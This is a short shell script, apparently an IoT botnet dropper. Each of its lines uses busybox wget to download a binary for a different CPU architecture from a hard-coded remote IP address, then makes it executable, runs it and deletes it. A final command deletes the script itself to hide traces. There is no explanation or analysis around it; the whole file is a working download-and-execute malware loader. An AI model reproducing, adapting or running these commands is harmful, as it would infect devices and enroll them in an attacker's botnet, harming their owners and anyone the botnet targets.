busybox wget http://66.29.151.122/bins/arm; chmod 777 arm; ./arm arm; rm -rf arm
busybox wget http://66.29.151.122/bins/eueuzua; chmod 777 eueuzua; ./eueuzua arm5; rm -rf eueuzua
busybox wget http://66.29.151.122/bins/arm6; chmod 777 arm6; ./arm6 arm6; rm -rf arm6
busybox wget http://66.29.151.122/bins/djsuaux; chmod 777 djsuaux; ./djsuaux arm7; rm -rf djsuaux
busybox wget http://66.29.151.122/bins/sh4; chmod 777 sh4; ./sh4 sh4; rm -rf sh4
busybox wget http://66.29.151.122/bins/spc; chmod 777 spc; ./spc spc; rm -rf spc
busybox wget http://66.29.151.122/bins/dujejaiw; chmod 777 dujejaiw; ./dujejaiw mips; rm -rf dujejaiw
busybox wget http://66.29.151.122/bins/mpsl; chmod 777 mpsl; ./mpsl mpsl; rm -rf mpsl
busybox wget http://66.29.151.122/bins/spc; chmod 777 spc; ./spc spc; rm -rf spc
busybox wget http://66.29.151.122/bins/djduawa; chmod 777 djduawa; ./djduawa x86_64; rm -rf djduawa
busybox wget http://66.29.151.122/bins/i686; chmod 777 i686; ./i686 android; rm -rf i686
busybox wget http://66.29.151.122/bins/m68k; chmod 777 m68k; ./m68k m68k; rm -rf m68k

rm $0